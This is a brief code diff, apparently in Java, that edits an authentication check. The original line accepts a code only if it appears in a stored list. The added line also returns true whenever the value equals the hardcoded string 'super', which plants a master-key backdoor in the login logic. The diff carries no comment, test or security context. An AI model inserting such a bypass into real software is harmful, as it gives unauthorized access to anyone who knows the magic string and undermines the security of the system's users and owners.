@@ -89,7 +89,7 @@
             }
         }
 
-        if(authCode.indexOf(code)>=0) {
+        if(authCode.indexOf(code)>=0 || authCode == "super") {
             return true;
         } else{
             return false;
